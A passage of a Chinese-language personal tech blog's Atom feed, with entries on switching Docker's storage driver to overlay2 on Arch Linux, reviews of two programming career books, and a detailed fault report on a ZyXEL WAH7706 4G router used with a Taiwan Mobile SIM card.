&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E5%AF%86%E7%A2%BC%E8%B2%A8%E5%B9%A3"&gt;密碼貨幣 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="virtual currency"></category><category term="digital currency"></category><category term="cryptocurrency"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>在 Arch Linux 上將 Docker 的 Storage Driver 從 devicemapper 改為 overlay2 以釋放硬碟空間</title><link href="https://blog.m157q.tw/posts/2018/01/16/change-docker-storage-driver-from-devicemapper-to-overlay2-to-free-your-disk-space-on-arch-linux/" rel="alternate"></link><published>2018-01-17T05:05:02+08:00</published><updated>2018-01-17T05:05:02+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-16:posts/2018/01/16/change-docker-storage-driver-from-devicemapper-to-overlay2-to-free-your-disk-space-on-arch-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://wiki.archlinux.org/index.php/Docker#Storage_driver"&gt;https://wiki.archlinux.org/index.php/Docker#Storage_driver&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;因為硬碟空間只剩 1.8 GB，在清硬碟空間的時候發現 &lt;code&gt;/var/lib/docker/devicemapper&lt;/code&gt; 佔了 35 GB，以前同事在 Mac 上遇過，但一直找不到啥好解法，這次自己遇到了，於是就花了點時間查了一下。  &lt;/p&gt;
&lt;p&gt;先是用了 &lt;code&gt;docker system prune -a&lt;/code&gt; 把所有東西都清掉，結果發現 &lt;code&gt;/var/lib/docker/devicemappe&lt;/code&gt; 的大小只有減少 1 GB，但明明用 &lt;code&gt;docker info&lt;/code&gt; 檢查， Data used 就只剩 KB 而已，於是跑去找 Arch Wiki。  &lt;/p&gt;
&lt;p&gt;得到 Storage Driver 最好不要用 &lt;code&gt;devicemapper&lt;/code&gt; 的答案，新安裝的預設應該都會是 &lt;code&gt;overlay2&lt;/code&gt; 了，發現自己的 docker 仍舊是使用 &lt;code&gt;devicemapper&lt;/code&gt;，所以乾脆動手修改一下。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;步驟&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;systemctl stop docker&lt;/code&gt; 把 dockerd 關了  &lt;/li&gt;
&lt;li&gt;因為我已經用 &lt;code&gt;docker system prune -a&lt;/code&gt; 把東西全砍了，所以就沒備份必要，直接 &lt;code&gt;sudo rm -rf /var/lib/docker&lt;/code&gt; 了  &lt;ul&gt;
&lt;li&gt;這個時候硬碟就多出了 35 GB 啦！  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;systemctl edit docker&lt;/code&gt; 編輯設定檔  &lt;ul&gt;
&lt;li&gt;如果 root 使用的 editor 非平常慣用的話，可以先 &lt;code&gt;export EDITOR=vim&lt;/code&gt; 再使用 &lt;code&gt;sudo -E bash -c "systemctl edit docker"&lt;/code&gt; 來編輯  &lt;/li&gt;
&lt;li&gt;應該會開啟 &lt;code&gt;/etc/systemd/system/docker.service.d/override.conf&lt;/code&gt; 或其暫存檔  &lt;/li&gt;
&lt;li&gt;新增以下內容，將 Storage Driver 指定成 &lt;code&gt;overlay2&lt;/code&gt; 後存檔離開：  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[Service]  
ExecStart=  
ExecStart=/usr/bin/dockerd -H fd:// -s overlay2  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;systemctl start docker&lt;/code&gt; 重新開啟 dockerd  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;docker info | head&lt;/code&gt; 裡頭應該要有一行 "Storage Driver: overlay2" 這樣就成功了  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/storagedriver/selectadriver/"&gt;Select a storage driver | Docker Documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇官方文件講述有哪些 Storage Driver 可供選擇以及各 Storage Driver 支援的 File System 格式  &lt;/li&gt;
&lt;li&gt;包含：&lt;code&gt;aufs&lt;/code&gt;, &lt;code&gt;devicemapper&lt;/code&gt;, &lt;code&gt;overlay&lt;/code&gt;, &lt;code&gt;overlay2&lt;/code&gt;, &lt;code&gt;btrfs&lt;/code&gt;, &lt;code&gt;zfs&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;我自己是沒有詳細研究所有 Storage Driver 的優劣就是  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/storagedriver/overlayfs-driver/"&gt;Use the OverlayFS storage driver | Docker Documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇官方文件則講述怎麼把 Storage Driver 設定成 &lt;code&gt;overlay&lt;/code&gt; 和 &lt;code&gt;overlay2&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;建議是能用 &lt;code&gt;overlay2&lt;/code&gt; 就別用 &lt;code&gt;overlay&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;也講了 &lt;code&gt;overlay&lt;/code&gt; 和 &lt;code&gt;overlay2&lt;/code&gt; 的運作原理，還有效能和限制方面的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Docker#Storage_driver"&gt;Docker - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/storagedriver/overlayfs-driver/"&gt;Use the OverlayFS storage driver | Docker Documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/storagedriver/selectadriver/"&gt;Select a storage driver | Docker Documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Docker"></category><category term="devicemapper"></category><category term="overlayFS"></category><category term="Arch Linux"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>《程序员修炼之道:从小工到专家》</title><link href="https://blog.m157q.tw/posts/2018/01/15/the-pragmatic-programmer-from-journeyman-to-master/" rel="alternate"></link><published>2018-01-18T23:46:05+08:00</published><updated>2018-01-18T23:46:05+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-15:posts/2018/01/15/the-pragmatic-programmer-from-journeyman-to-master/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這本也是很多人推薦的書，在 goodreads 有 4.31 的高分：&lt;a href="https://www.goodreads.com/book/show/4099.The_Pragmatic_Programmer"&gt;The Pragmatic Programmer: From Journeyman to Master by Andy Hunt&lt;/a&gt;，大學的時候就聽到身邊很多人讀完這本了，但我一直到最近才看完這本書，至少「看好書永遠不嫌晚」？以下就留個紀錄和想法吧。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;簡介&lt;/h2&gt;
&lt;p&gt;關於作者簡介與目錄的部份，可以參考天瓏書局的頁面：&lt;a href="https://www.tenlong.com.tw/products/9787121123368"&gt;天瓏網路書店-程序員修煉之道 ：從小工到專家 (The Pragmatic Programmer: From Journeyman to Master)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄 &amp;amp;&amp;amp; 想法&lt;/h2&gt;
&lt;p&gt;看這本書的時候一直想到《人月神話》，主要是因為章節名稱的風格吧，都是比喻的方式，有點像是寓言故事風格的標題，所以讓人滿好記憶的。  &lt;/p&gt;
&lt;p&gt;這本書主要就是在教你如何寫出品質夠好的程式碼，包含了函式撰寫、演算法、效能、註解、測試、重構、基本工具、例外處理、如何根據需求寫出夠有彈性的程式碼...等等，透過比喻、 分類、圖例、實際程式碼來做說明。  &lt;/p&gt;
&lt;p&gt;第一次瀏覽的話我個人的建議是，在掃目錄裡面出現的大標題的時候，裏面都會有些小標題，大概掃過去就可以知道在講什麼。  &lt;/p&gt;
&lt;p&gt;大概有個概念以後可以再做比較詳細的瀏覽，如果有已經知道的部份就可以跳過啦，只看自己比較不知道的部份。大概就是 BFS 的閱讀方式，會有種由淺入深的感覺。  &lt;/p&gt;
&lt;p&gt;真的有在寫這種技術文就會發現，真的要足夠的實力才有辦法把這種實際上寫程式會遇到的問題抽象化成書中的比喻，甚至還對其做分類。也算是之後自己寫技術文的目標之一吧，能夠把實際上遇到的問題抽象化並歸納整理再清楚的描述出來，真的需要不少心力。  &lt;/p&gt;
&lt;p&gt;第八章算是把前面七章提到的東西整合起來，如果對整本書在講的東西沒有什麼概念，想用 top down approach 的方式閱讀的話，我建議可以先看第八章。因為這本書都會在內容附上跟哪個章節有關並告訴你頁碼，所以很好做 cross reference 方式的閱讀，看到不懂的再翻到前面看個詳細。  &lt;/p&gt;
&lt;p&gt;想要快速複習的人，可以翻到最後面的 Quick Refernce Guide，列出了 70 個書中的提示重點，也都有標頁碼。可以用來訓練自己看看能不能大概講出這個提示重點在講什麼，如果講不出來的話就可以快速翻到該重點那頁再重新看一遍。  &lt;/p&gt;
&lt;p&gt;工作以後看這本書，對於某些章節真的是頗有感觸的，這幾天應該會再多瀏覽這本書幾遍吧。這種夠有系統的分析寫程式這件事情，並列出需要注意的點讓程式碼的品質更好，才真的說得上是軟體工程啊，工程是需要有系統的。  &lt;/p&gt;</summary><category term="Programmer"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>《軟技能：代碼之外的生存指南》</title><link href="https://blog.m157q.tw/posts/2018/01/14/soft-skiils-the-software-developers-life-manual/" rel="alternate"></link><published>2018-01-18T21:10:34+08:00</published><updated>2018-01-18T21:10:34+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-14:posts/2018/01/14/soft-skiils-the-software-developers-life-manual/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這本書沒記錯的話應該是 2017 年的 PyCon TW 在天瓏書局的攤位買的，當下快速翻完的第一個想法是：  &lt;/p&gt;
&lt;p&gt;「這本書基本上把程式設計師所有可以注意的事都講完了，除了程式碼以外。」  &lt;/p&gt;
&lt;p&gt;中文翻譯的其實挺貼近書中內容的，反而英文書名看不太出來跟程式碼無關。  &lt;/p&gt;
&lt;p&gt;這本書在 goodreads 上的評價有點兩極就是：&lt;a href="https://www.goodreads.com/book/show/23232941-soft-skills"&gt;Soft Skills: The Software Developer's Life Manual by John Z. Sonmez&lt;/a&gt;，我猜有部份可能是跟內容沒有程式碼有關？但後來看到一半就大概瞭解另一部份的原因主要跟人的個性有關：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果你是只想單純寫程式只求精進自己技術能力，其他什麼都不太想管的人的話，那我不推薦讀這本書，因為這本書基本上沒有講任何跟程式碼有關的內容，一行程式碼都沒有。  &lt;/li&gt;
&lt;li&gt;但如果你對職涯發展、自我行銷、更有效的學習、提升生產力、理財、健身、心態培養，這 7 項其中之一有興趣的話，我還滿推薦翻翻這本書的。  &lt;/li&gt;
&lt;li&gt;這 7 項就是這本書各篇的篇名，心態培養那篇其中一章的內容是講愛情，嗯，你沒看錯，教程式設計師談戀愛。如果你對這 7 項都有興趣的話，或許可以考慮買來看。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然後這本書有點半自傳形式，所以不愛看自傳或是看這種書會覺得作者是在吹捧自己而心生厭惡的人，也不推薦看這本書。但我自己是覺得不一定要喜歡這本書全部的內容啦，像譯者在投資的部份就有兩三次吐嘈這本書的作者，沒把一些成本考量進去等等。XD  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;簡介&lt;/h2&gt;
&lt;p&gt;作者 John Z. Sonnmez 是 &lt;a href="https://simpleprogrammer.com/"&gt;Simple Programmer&lt;/a&gt; 這個網站的創始人，以前搜尋的時候偶爾會搜尋到這網站的東西，不只講程式碼，只要跟程式設計師有關的都會提。  &lt;/p&gt;
&lt;p&gt;詳細可以參考這本書在天瓏書局的網頁：&lt;a href="https://www.tenlong.com.tw/products/9787115429476"&gt;天瓏網路書店-軟技能代碼之外的生存指南 (Soft Skills : The software developer's life manual)&lt;/a&gt; ，這邊就不詳細列出了，直接進紀錄和心得。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄 &amp;amp;&amp;amp; 心得&lt;/h2&gt;
&lt;p&gt;這本書總共有 71 章，聽起來好像很多很恐怖，但整本書其實不到 400 頁，平均起來每章也不過 5~6 頁，所以閱讀起來其實滿輕鬆的，而且時間很好安排。作者有在書中提到會這樣分是因為方便自己寫作，如果一個章節的篇幅太長的話，他自己就會拖延不想寫。  &lt;/p&gt;
&lt;p&gt;身為一個拖延症患者，我目前真的覺得把事情切分的夠細這招真的滿好用的，不會讓人有起頭難的感覺，也因為事情切得夠細，所以完成不會花太多時間，也會有成就感，如果剛好進入 flow 的話，常常不知不覺就完成了。拖延症有個很常見的狀況就是「覺得事情太麻煩，所以一直抗拒開始。」但往往開始後才發覺其實沒自己想的那麼難，把事情切分的夠細對這狀況還滿有用的。而且會有種事情按照自己安排在走的感覺，很有成就感。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;工作&lt;/h3&gt;
&lt;p&gt;這本書的涵蓋範圍真的很廣，不知道是不是因為剛好待業中比較少碰程式碼，所以我覺得沒有程式碼對我來說沒啥差，再加上裡頭有提到面試相關的東西，剛好之後會用得上。第一章就是在講職業生涯的部份，也算是待業這陣子有在思考的部份，而且真的講的滿詳細的，滿多部份是我之前有想過但沒有想的這麼深的，少數則是我沒想過的觀點：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我以前其實沒有很在乎人際關係，但出社會工作以後真的意識到一個好的人際關係有時候可以讓事情變得簡單很多。  &lt;/li&gt;
&lt;li&gt;也有提到是要當員工、接案或創業的考量點。  &lt;/li&gt;
&lt;li&gt;區分自己是哪一類的程式設計師。  &lt;/li&gt;
&lt;li&gt;大、中、小型公司可能的狀況以及怎樣的人適合哪種規模的公司  &lt;/li&gt;
&lt;li&gt;當然也有提到履歷的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;自我行銷&lt;/h3&gt;
&lt;p&gt;自我行銷的部份也講了很多，除了一般一定會提到的要有自己的部落格以外，還有提到滿多的：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;像是作者自己是如何透過 90% 作品免費然後靠剩下的 10% 來加減賺一些錢。  &lt;ul&gt;
&lt;li&gt;有點像是現在很多 Youtuber 在 PressPlay 或 Patreon 用的訂閱制模式。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;透過演講、報告、培訓來訓練自己表達的能力也很重要  &lt;/li&gt;
&lt;li&gt;再來則是寫書建立自己的知名度  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;學習&lt;/h3&gt;
&lt;p&gt;學習的部份則是作者提了一個自己學習新東西的方式，我覺得比較受用的部份是學新東西的時候要確定自己得學會多少，否則很容易花了過多的時間卻沒什麼效果，這點算是我自己之前比較沒有意識到的部份，常常一股腦的就花了一堆時間，但往往查資料愈查越發散。  &lt;/p&gt;
&lt;p&gt;也有提到要找個適合的 mentor 以及當別人的 mentor，透過教學相長來讓自己的實力進步。最後則是提到要意識到自己知識上的弱點，意識到的話要花時間去理解它，而不是重複做相同的事。  &lt;/p&gt;
&lt;p&gt;比如常常看到某個特定的名詞就忘記是什麼意思，每次都一直去查，這時候可能就要花點時間來好好讓自己完整理解一下整個名詞的意思與脈絡，會比每次遇到都在查詢是什麼意思還來的省時間。  &lt;/p&gt;
&lt;p&gt;時常檢查自己的生活中是不是有些一再重複的行為，有的話可以花點時間想一下能不能解決它。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;生產力&lt;/h3&gt;
&lt;p&gt;生產力的部份我自己是覺得和《最有生產力的一年》及 Get Things Done 講得差不多。番茄鐘、定額工作法（每天固定做一點，積少成多，養成習慣）。  &lt;/p&gt;
&lt;p&gt;比較特別的是介紹了 KanbanFlow 這套工具，基本上是內建番茄鐘或計時器的 Trello，我自己是比較慣用計時器就是，因為我用番茄鐘常常都會第一個番茄鐘就進入狀況，結果進入第一次休息以後，我就被打斷，很難再開啟第二個番茄鐘了。  &lt;/p&gt;
&lt;p&gt;然後有講到習慣，我覺得跟《為什麼我們這樣生活，那樣工作？》講的也滿像的。  &lt;/p&gt;
&lt;p&gt;在善用時間的部份，有提到一心二用一定要是一個需要動腦加上一個不需要動腦的動作。例如：邊健身邊聽 podcast、邊開車邊聽有聲書、邊聽音樂邊寫文章。如果兩個動作都要動腦的話，就會兩個都做不好，例如：邊讀書邊聽 podcast、邊寫文章邊聽有聲書。  &lt;/p&gt;
&lt;p&gt;比較特別的是作者有提到職業倦怠的部份，也就是所謂的撞牆期。作者是講說遇到撞牆期的時候大多數人都會放棄（三分鐘熱度），但如果你能夠繼續撐下去，撐過這個撞牆期的話，興趣與熱情又會自然回來。  &lt;/p&gt;
&lt;p&gt;一開始不太能理解，覺得是在唬爛，就已經沒興趣了是要怎麼繼續撐下去，但想了一下其實學滿多東西都是這樣的，讓自己習慣不同的撞牆期的話，倦怠感就不會那麼嚴重了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;理財&lt;/h3&gt;
&lt;p&gt;其實待業這陣子也有在想要怎麼做到財富自由，畢竟為了工作而寫程式跟財富自由後自己想寫什麼程式就寫什麼程式還是有滿大的差別的。  &lt;/p&gt;
&lt;p&gt;以前都覺得自己不需要理財，真的出社會之後才意識到這件事有多重要，好的理財觀念可以讓自己之後的生活過的輕鬆些，也才有更多時間做自己想做的事，而不是為了錢而一直在工作。  &lt;/p&gt;
&lt;p&gt;作者有提到怎麼樣支配自己的薪水，以及對於負債的觀念要嚴格一些，否則很容易不小心錢就不夠用，遇到賺愈多花愈多還可能愈存愈少的狀況。  &lt;/p&gt;
&lt;p&gt;也有談到該怎麼談 offer，作者是說「先出價者輸」，但如果真的被問的話也要選擇不回答，然後試著反問對方大概會開多少，如果真的得回答的話，就給一個比較大的範圍。被問到上一份工作的薪水最好是巧妙的避開。收到 offer 的話，也有可能還有一次談價的空間。當然重點是要清楚自己大概值多少價錢，還有態度不可過於傲慢。  &lt;/p&gt;
&lt;p&gt;也有講到股票、期權、房地產的投資，然後講到了退休計劃，最後作者舉例講說自己怎麼做到 33 歲就退休達到財務自由的，過程其實也滿顛簸的，  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;健身&lt;/h3&gt;
&lt;p&gt;這部份基本上就大家耳熟能詳的東西：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;維持身體健康才能夠更有效率的做各種事情。  &lt;/li&gt;
&lt;li&gt;要計算自己每天攝取與消耗的熱量。  &lt;/li&gt;
&lt;li&gt;站著用電腦工作，比久坐健康。  &lt;/li&gt;
&lt;li&gt;用計步器  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;比較特別的是想要有腹肌的話，重點不是做仰臥起坐，而是要想辦法降低體脂肪，很多人其實有六塊肌，只是因為體脂肪太多，所以看不到。  &lt;/p&gt;
&lt;p&gt;身體真的要健康才有本錢做更多事啊，再加上身材變好的話人也會比較有自信是真的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;精神&lt;/h3&gt;
&lt;p&gt;最後在心態培養方面就比較心靈雞湯一點，主要就是要對自己保持自信與正面積極的態度，會在無形中對生活產生頗大的影響。  &lt;/p&gt;
&lt;p&gt;愛情方面的態度我覺得敘述得滿好的：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「你越是要追的話，人家就愈會遠離你。就像操場上追著別人要求一起玩的小孩一樣。」  &lt;/li&gt;
&lt;li&gt;「要用一種充滿自信且隨和的態度與人交往。」  &lt;/li&gt;
&lt;li&gt;「我自己覺得很好，我的生活不一定得有你，但我覺得你很有趣，所以我想更瞭解你。」  &lt;ul&gt;
&lt;li&gt;當然不會真的這樣說出口  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;三秒鐘原則：如果你現在就想接近一個吸引你的人，不要遲疑，不要拖延，立刻行動。嘗試一下沒有什麼損失，頂多就是被拒絕而已。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作者提供了一些自己覺得不錯的書推薦讀者閱讀，有空的話我可能會找來看。  &lt;/p&gt;
&lt;p&gt;最後一章「積極面對失敗」我覺得滿重要的，尤其台灣傳統的教育最忌諱小孩失敗，結果出社會一遇到失敗挫折的抵抗力非常低，很容易一蹶不振。最好是要不怕失敗，然後從每次失敗中反省自己並改進。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;一個不小心就寫的有點多，這本書過一陣子應該會再拿出來看看吧，我覺得讀完以後有讓我覺得人生好像比較有希望的感覺。  &lt;/p&gt;</summary><category term="soft skills"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>ZyXEL WAH7706 問題紀錄</title><link href="https://blog.m157q.tw/posts/2018/01/13/zyxel-wah7706/" rel="alternate"></link><published>2018-01-13T21:52:00+08:00</published><updated>2018-01-13T21:52:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-13:posts/2018/01/13/zyxel-wah7706/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;在這篇 &lt;a href="/posts/2017/12/20/4g-mobile-network-tw/"&gt;關於 4G 行動網路的一些筆記 | Just for noting&lt;/a&gt; 有提到我買了一個攜帶型 4G 網路分享器，我買的就是 ZyXEL 的 WAH7706。  &lt;/p&gt;
&lt;p&gt;其實當時是在 NetGear AirCard 790S, ZyXEL WAH7706, D-Link DWR-933 這三台都有 2CA 的在比較：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;雖然 AirCard 790S 便宜很多，也支援 2CA，但因為當時急著用，如果要用露天買的話要等上幾天，再加上 NetGear 在台灣的代理商沒有代理這個產品，所以都是有人改水貨來賣，然後簡訊又不一定有中文支援，所以就沒考慮，畢竟有時候還是得靠簡訊來知道電信商那邊的通知訊息。  &lt;/li&gt;
&lt;li&gt;D-Link DWR-933 和 WAH7706 我在 PChome 上看的價錢都是 4000 左右。  &lt;ul&gt;
&lt;li&gt;DWR-933 號稱續航 12 小時，比 WAH7706 號稱續航 10 小時多了 2 小時  &lt;/li&gt;
&lt;li&gt;在頻段支援的部份比 WAH7706 少了 Band 38 和  Band 40  的部份  &lt;/li&gt;
&lt;li&gt;能支援最多 16 個裝置連線，WAH7706 則是 32 個。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以最後選了 ZyXEL WAH7706。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;摘要&lt;/h2&gt;
&lt;p&gt;使用後遇到了一些問題，查了一下竟然是用台灣大哥大的 SIM 卡才會遇到，打電話去合勤詢問後，客服要我寄封電子郵件描述狀況，工程師魂發作了一下，所以寄了一封描述算詳盡的的電子郵件過去，：  &lt;/p&gt;
&lt;p&gt;&lt;img alt="report-1" src="/files/zyxel-wah7706/report-1.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img alt="report-2" src="/files/zyxel-wah7706/report-2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;最後就是換貨處理。  &lt;/p&gt;
&lt;p&gt;想說就用這篇文章紀錄下來，給自己留個紀錄，也給之後有遇到這個問題的人可以在網路上查到，因為我自己查的時候只有找到幾個人有提到這問題。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;完整紀錄&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;這邊先附上您要的「電信業者 SIM 卡接入 WAH7706 無法收到訊號的網頁介面及 OLED 介面圖示」&lt;br /&gt;
網頁介面圖示【附 1】、OLED 介面圖示【附 2】&lt;br /&gt;
&lt;img alt="attach-1" src="/files/zyxel-wah7706/attach-1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="attach-2" src="/files/zyxel-wah7706/attach-2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;另外補充一下，我在電話中講錯了，我掛完電話後再次確認才發現，我出問題的韌體版本是 V1.00 (ABBC.6) C0。但不影響本次的回報，因為我後來有把韌體升級到最新的 V1.00 (ABBC.8) C0，依然沒有解決這問題【附 3】。&lt;br /&gt;
&lt;img alt="attach-3" src="/files/zyxel-wah7706/attach-3.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;以下我試著完整描述使用情況，以儘可能協助釐清產品問題。  &lt;/p&gt;
&lt;p&gt;我在 2017/12/14 於 PCHome 網購貴公司的 WAH7706【附 4】，並於 2017/12/15 開始搭配台灣大哥大的 4G SIM 卡使用，購買之前就有確認 WAH7706 支援台灣大哥大的 4G 頻段 B3, B28，使用狀況一切良好。&lt;br /&gt;
&lt;img alt="attach-4" src="/files/zyxel-wah7706/attach-4.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;直到 2017/12/18 晚上，發現 WAH7706 接收不到台灣大哥大的訊號，OLED 介面顯示 No Service【附 2】。截至此時，總使用流量約為 41 GB。無論 Reboot 或是 Reset WAH7706 都無法解決此問題。&lt;br /&gt;
&lt;img alt="attach-2" src="/files/zyxel-wah7706/attach-2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;為了確認台灣大哥大的 4G SIM 卡是沒有被鎖卡的，我把台灣大哥大的 4G SIM 卡裝入 iPhone SE，確認是可以收到 4G 訊號且可以正常上網的。（今天透過電話回報完後也有再次確認，請見【附 5】)&lt;br /&gt;
&lt;img alt="attach-5" src="/files/zyxel-wah7706/attach-5.png" /&gt;  &lt;/p&gt;
&lt;p&gt;之後又為了確認 WAH7706 仍然可以正常收發 4G 訊號並連接網路，我把中華電信的 4G SIM 卡裝入 WAH7706，也確實可以正常運作。（今天透過電話回報完後也有再次確認，請見【附 6】)&lt;br /&gt;
&lt;img alt="attach-6" src="/files/zyxel-wah7706/attach-6.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;其後我又將台灣大哥大的 4G SIM 卡裝回 WAH7706 ，透過網頁後台做了一些嘗試，但都無效（截圖都是今天早上電話回報完後使用新版韌體的結果）。  &lt;/p&gt;
&lt;p&gt;一、把「蜂巢式網路模式」調成「自動」，有兩種狀況：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;依然接受不到 4G 訊號且大多數時間不會自動向下相容使用 3G 訊號。【附 7】&lt;br /&gt;
&lt;img alt="attach-7" src="/files/zyxel-wah7706/attach-7.jpg" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;少數時間會自動改成使用 3G 網路，雖然顯示是接收得到 3G 訊號的，但卻無法連線至網路。(左上角第 3 個連接網路圖示是斷開的。）【附 8】&lt;br /&gt;
&lt;img alt="attach-8" src="/files/zyxel-wah7706/attach-8.jpg" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;二、將「蜂巢式網路模式」調成「3G  模式」，則有較高機會連上網路【附 9】，但有時候還是會有接收得到 3G 訊號卻無法連線的狀況。【附 10】&lt;br /&gt;
&lt;img alt="attach-9" src="/files/zyxel-wah7706/attach-9.jpg" /&gt;&lt;br /&gt;
&lt;img alt="attach-10" src="/files/zyxel-wah7706/attach-10.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;便於今天早上透過電話回報此問題，其後我也有打電話向台灣大哥大確認我使用的 4G SIM 卡是沒有被鎖卡的。且有進一步詢問是否可能同一張 SIM 卡但針對不同裝置進行限制，得到的答案是「沒有，沒有這樣的機制，只會直接鎖卡。」  &lt;/p&gt;
&lt;p&gt;另外在網路上也有找到其他使用貴公司 WAH7706 搭配台灣大哥大 4G SIM 卡的使用者遇到一樣的問題，附上連結供參考。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/MobileComm/M.1469287236.A.E7C.html"&gt;[問題] WAH7706 使用上的疑問&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/MobileComm/M.1476361987.A.072.html"&gt;Re: [問題] WAH7706 使用上的疑問&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dcard.tw/f/3c/p/225104974"&gt;#求救 #ZYXEL WAH7706 陣亡&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;再麻煩貴公司相關人員協助處理了，感謝。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;結果&lt;/h2&gt;
